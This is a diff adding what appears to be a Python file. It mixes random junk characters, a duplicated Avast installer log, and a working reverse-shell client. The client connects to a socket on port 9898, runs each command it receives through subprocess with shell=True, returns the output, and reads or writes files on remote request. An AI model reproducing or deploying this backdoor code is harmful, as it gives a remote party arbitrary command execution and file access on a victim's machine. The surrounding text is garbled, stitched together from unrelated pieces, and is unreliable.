@@ -1,0 +1,229 @@
+
+ed3cddcededcedcdedcedcdcdceedcdcdcedcedcedcedcdcedceded
+
+
+fcdeeeedddd
+void sayHelloTopeople
+
+07:38 08-07-2021 07:38 08-07-20214 07:38 08-07-2021 07:38 08-07-20214 07:38 08-07-20214 vb                  4 t507:38 08-07-20216 07:38 08-07-2021tR6 07:45 08-07-2021
++-
++----
++-**.
+
+
+
+
+2021-07-26 05:41:57.384Infoinstup[10500,6024]Command: '"C:\WINDOWS\Temp\asw.c240e766899fd0ab\instup.exe" /sfx:lite /sfxstorage:C:\WINDOWS\Temp\asw.c240e766899fd0ab /edition:1 /prod:ais /guid:93d79be9-f1d7-4ea2-a4f5-b317f4e56c1b /ga_clientid:bbc79163-bf2f-4f3e-8eb1-17c25b7f546b /cookie:mmm_ava_003_999_a5g_m /ga_clientid:bbc79163-bf2f-4f3e-8eb1-17c25b7f546b /edat_dir:C:\WINDOWS\Temp\asw.a9faea1604fa139f'
+2021-07-26 05:41:57.384Infoinstup[10500,6024]CPU: Intel(R) Core(TM) i3-4150 CPU @ 3.50GHz,4
+2021-07-26 05:41:57.384Infoinstup[10500,6024]OS: Windows 10 (10.0.19043) x64
+2021-07-26 05:41:57.384Infoinstup[10500,6024]setup: x64
+2021-07-26 05:41:57.384Infoinstup[10500,6024]Memory: 60% load. Phys:3282976/8303556K free, Page:3329500/9614276K free, Virt:135287100948/137438953344K free
+2021-07-26 05:41:57.384Infoinstup[10500,6024]DISKs: C:\ - 36591MB free / 77GB total
+2021-07-26 05:41:57.384Infoinstup[10500,6024]DISKs: D:\ - 430190MB free / 426GB total
+2021-07-26 05:41:57.384Infoinstup[10500,6024]DISKs: E:\ - 365553MB free / 426GB total
+2021-07-26 05:41:57.384Infoinstup[10500,6024]Running module version: instup.exe - '21.5.6354.0'
+2021-07-26 05:41:57.384Infoinstup[10500,6024]Running module version: Instup.dll - '21.5.6354.0'
+2021-07-26 05:41:57.397Infomutex[10500,6024]The ownership of the secure mutex has been successfully taken.
+2021-07-26 05:41:57.405Infoshepsync[10500,6024]Wait interval 60
+2021-07-26 05:41:57.405Infoini_access[10500,5948]watch task for C:\WINDOWS\Temp\asw.c240e766899fd0ab\config.ini started
+2021-07-26 05:41:57.406Infoini_access[10500,5948]watch task for C:\WINDOWS\Temp\asw.c240e766899fd0ab\servers.def started
+2021-07-26 05:41:57.407Infoini_access[10500,5948]watch task for C:\WINDOWS\Temp\asw.c240e766899fd0ab\config.def started
+2021-07-26 05:41:57.408Infoini_access[10500,5948]watch task for C:\WINDOWS\Temp\asw.c240e766899fd0ab\avast5.ini started
+2021-07-26 05:41:57.429Infoshepsync[10500,6024]Trying server IP address '77.234.44.103'
+2021-07-26 05:41:59.014Infoshepsync[10500,6024]Download of config file config.def from shepherd.ff.avast.com succeeded.
+2021-07-26 05:41:59.020Infoshepsync[10500,6024]Config file C:\WINDOWS\Temp\asw.c240e766899fd0ab\config.def successfully updated to version 3999
+2021-07-26 05:42:01.038Infoshepsync[10500,6024]Postpone interval was reset
+2021-07-26 05:42:01.086Infowizard[10500,6024]Running module version: HTMLayout.dll - '21.5.6354.0'
+2021-07-26 05:42:01.109Infowizard[10500,6024]Loaded module version: C:\Windows\Temp\asw.c240e766899fd0ab\HTMLayout.dll - '21.5.6354.0'
+2021-07-26 05:42:01.292Infowizard[10500,6024]Setup gui was successfully started.
+
+
+
+
+
+
+import socket
+import os
+import subprocess
+
+s = socket.socket()
+device_name = socket.gethostname()
+host = socket.gethostbyname(device_name)  # '127.0.0.1'
+port = 9898
+server_addr = (host, port)
+s.connect(server_addr)
+# port = socket.getprotobyname('127.0.0.1')
+respone_size = 30000
+
+
+def read_file_as_text(file_name):
+    f = open(file_name, 'r')
+    d = f.read()
+    return d
+
+
+# exit_to_write = False
+
+
+def write_data_to_file():
+    FILE_RESPONSE_SIZE = 30000
+    s.send(str.encode('Enter file name with in the local directory... : '))
+    file_name = s.recv(5000).decode('utf-8')
+    f = open(file_name, 'w')
+    print('File Location in this Device : ...')
+    o = "--------To Stop Editing File , Then end the text with ---'*'---" + '\n' + 'Type a sentence and end it with an *' + '\n'+ 'Enter your text ....'
+    s.send(str.encode(
+        o
+    ))
+    print('method *')
+    global exit_to_write
+    exit_to_write = False
+    # file_name = s.recv(1024).decode('utf-8')
+    # f = open(file_name, 'w')
+    # s.send(str.encode(
+    #     "--------To Stop Editing File , Then end the text with ---'*'---" + "\n" + ('Enter your text ....'))
+    # )
+    print('strt input ....')
+    data_ = s.recv(FILE_RESPONSE_SIZE).decode('utf-8')
+    # data_ = str(input('Type a sentence and end it with an *'))
+    print(data_[-1], type(data_))
+    while data_[-1] != '*':
+        print('while strt')
+        s.send(str.encode('ok....'))
+        data_ = s.recv(FILE_RESPONSE_SIZE).decode('utf-8')
+        print('sent...')
+        # data_ = str(input('Enter your Text...'))
+        f.write(data_)
+        FILE_RESPONSE_SIZE += 10000
+
+    f.write(data_)
+    print(data_  + '\n' + 'written...')
+    f.close()
+    s.send(str.encode('Successfully data is save & file is safely closed'))
+    # if data[-1] == '*':
+    #     print('---ok---')
+    #     f.write(str(data_))
+    #     s.send(str.encode('Editing File Over.... 1'))
+    #     f.close()
+    #     exit_to_write = False
+    #     s.send(str.encode('Successfully data is save & file is safely closed'))
+    # else:
+    #     print('******-*-*-*-*')
+    #     f.write(str(data_))
+    #     exit_to_write = True
+
+
+while True:
+    respone_size += 20000
+    data = s.recv(1024)
+    if data[:2].decode('utf-8') == "cd":
+        os.chdir(data[3:].decode('utf-8'))
+
+    if len(data) > 0:
+        if data.decode('utf-8') == "e":
+            # s.send(str.encode(input('Enter file name with in the local directory... : ')))
+            # s.send(file_name = str(input('Enter file name with in the local directory... : ')))
+            # while True:
+            #     edit_file()
+            #     break
+            # s.send(str.encode('Enter file name with in the local directory... : '))
+            # file_name = s.recv(1024).decode('utf-8')
+            # f = open(file_name, 'w')
+            # s.send(str.encode(
+            #     "--------To Stop Editing File , Then end the text with ---'*'---" + "\n" + ('Enter your text ....'))
+            # )
+            # global exit_to_write
+            # exit_to_write = True
+            # while exit_to_write:
+            write_data_to_file()  # s.recv(respone_size).decode('utf-8')
+
+        if data.decode('utf-8') == "r":
+            # file_name = str(input('Enter file name with in the local directory... : '))
+            s.send(str.encode('Enter file name with in the local directory... : '))
+            file_name = s.recv(respone_size).decode('utf-8')
+            # s.send(str.encode(read_file_as_text(file_name)))
+            f = open(file_name, 'r')
+            d = f.read()
+            s.send(str.encode(d))
+
+        if data.decode('utf-8') != "e" and data.decode('utf-8') != "r":
+            cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()  # return bytes
+            output_str = str(output_byte, 'utf-8')
+            current_dir = os.getcwd() + ">"
+            s.send(str.encode(output_str + current_dir))
+            print(output_str)
+            print('===========================================================')
+            read_file_as_text('h.txt')
+
+# while True:
+#     d = data
+#     d = s.recv(respone_size).decode('utf-8')
+#     if data[-1] == '*':
+#         f.write(str(d))
+#         s.send(str.encode('Editing File Over.... 1'))
+#         f.close()
+#         break
+#
+#     else:
+#         f.write(str(d))
+#         d = s.recv(10000).decode('utf-8')
+#         while True:
+#             if data[-1] == '*':
+#                 s.send(str.encode('Editing File Over.... 2'))
+#                 f.close()
+#                 break
+# ededeeeddcdecededccccccccccccccccccccccccccccedeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccceeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeedeeeeeeeeeeeeeedeeeeeeeeccccccccccccccccccedccccccedcccccccccccccccccccdddddddddddddddddddddddddddddddddddddddddcccccccccccccccccccccccceeeeeeeeeeeeeeececedcdceeeeeeeeeedcedceedcedcdceedcdcecededcdceddecedcedcdcedcedcecededcdcdceedcedccedceddcdeedcdcedcedcceddcececcddce
+#
+# cdecdedcecdedceedcdceedcecedcdceedcedcedcedc
+# dceedcedcedcedcedcdecedccccccccccccccccccccccccccccccccccccccccc
+#
+# eeeddddddddddddddddddddddddddddddddddddddddddddddccccccccccccccccccccccccccccccccccccceeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeddddddddddddddddddddddddddddddddddddddddddddddccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
+# eddedededcccccccdddddeeeeedddddddddddxxxxxxxxxxxxxxxxxxxxxx
+# ededeededcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeecccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccddddddddddddddddddddd
+# ededededeedccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
+# eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
+# dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
+#
+#
+# eddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddlfs56789
+# edcccc33rreeeeeeeeeeeeeeeeeeeeddddddddddddddddddddccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccddddddddddddd
+# edccdededeee3333333333333333333cddcdcdcdc
+#
+# ed3cddcededcedcdedcedcdcdceedcdcdcedcedcedcedcdcedceded
+#
+#
+# fcdeeeedddd
+# void sayHelloTopeople
+#
+# 07:38 08-07-2021 07:38 08-07-20214 07:38 08-07-2021 07:38 08-07-20214 07:38 08-07-20214 vb                  4 t507:38 08-07-20216 07:38 08-07-2021tR6 07:45 08-07-2021
+# +-
+# +----
+# +-**.
+#
+#
+#
+#
+# 2021-07-26 05:41:57.384Infoinstup[10500,6024]Command: '"C:\WINDOWS\Temp\asw.c240e766899fd0ab\instup.exe" /sfx:lite /sfxstorage:C:\WINDOWS\Temp\asw.c240e766899fd0ab /edition:1 /prod:ais /guid:93d79be9-f1d7-4ea2-a4f5-b317f4e56c1b /ga_clientid:bbc79163-bf2f-4f3e-8eb1-17c25b7f546b /cookie:mmm_ava_003_999_a5g_m /ga_clientid:bbc79163-bf2f-4f3e-8eb1-17c25b7f546b /edat_dir:C:\WINDOWS\Temp\asw.a9faea1604fa139f'
+# 2021-07-26 05:41:57.384Infoinstup[10500,6024]CPU: Intel(R) Core(TM) i3-4150 CPU @ 3.50GHz,4
+# 2021-07-26 05:41:57.384Infoinstup[10500,6024]OS: Windows 10 (10.0.19043) x64
+# 2021-07-26 05:41:57.384Infoinstup[10500,6024]setup: x64
+# 2021-07-26 05:41:57.384Infoinstup[10500,6024]Memory: 60% load. Phys:3282976/8303556K free, Page:3329500/9614276K free, Virt:135287100948/137438953344K free
+# 2021-07-26 05:41:57.384Infoinstup[10500,6024]DISKs: C:\ - 36591MB free / 77GB total
+# 2021-07-26 05:41:57.384Infoinstup[10500,6024]DISKs: D:\ - 430190MB free / 426GB total
+# 2021-07-26 05:41:57.384Infoinstup[10500,6024]DISKs: E:\ - 365553MB free / 426GB total
+# 2021-07-26 05:41:57.384Infoinstup[10500,6024]Running module version: instup.exe - '21.5.6354.0'
+# 2021-07-26 05:41:57.384Infoinstup[10500,6024]Running module version: Instup.dll - '21.5.6354.0'
+# 2021-07-26 05:41:57.397Infomutex[10500,6024]The ownership of the secure mutex has been successfully taken.
+# 2021-07-26 05:41:57.405Infoshepsync[10500,6024]Wait interval 60
+# 2021-07-26 05:41:57.405Infoini_access[10500,5948]watch task for C:\WINDOWS\Temp\asw.c240e766899fd0ab\config.ini started
+# 2021-07-26 05:41:57.406Infoini_access[10500,5948]watch task for C:\WINDOWS\Temp\asw.c240e766899fd0ab\servers.def started
+# 2021-07-26 05:41:57.407Infoini_access[10500,5948]watch task for C:\WINDOWS\Temp\asw.c240e766899fd0ab\config.def started
+# 2021-07-26 05:41:57.408Infoini_access[10500,5948]watch task for C:\WINDOWS\Temp\asw.c240e766899fd0ab\avast5.ini started
+# 2021-07-26 05:41:57.429Infoshepsync[10500,6024]Trying server IP address '77.234.44.103'
+# 2021-07-26 05:41:59.014Infoshepsync[10500,6024]Download of config file config.def from shepherd.ff.avast.com succeeded.
+# 2021-07-26 05:41:59.020Infoshepsync[10500,6024]Config file C:\WINDOWS\Temp\asw.c240e766899fd0ab\config.def successfully updated to version 3999
+# 2021-07-26 05:42:01.038Infoshepsync[10500,6024]Postpone interval was reset
+# 2021-07-26 05:42:01.086Infowizard[10500,6024]Running module version: HTMLayout.dll - '21.5.6354.0'
+# 2021-07-26 05:42:01.109Infowizard[10500,6024]Loaded module version: C:\Windows\Temp\asw.c240e766899fd0ab\HTMLayout.dll - '21.5.6354.0'
+# 2021-07-26 05:42:01.292Infowizard[10500,6024]Setup gui was successfully started.
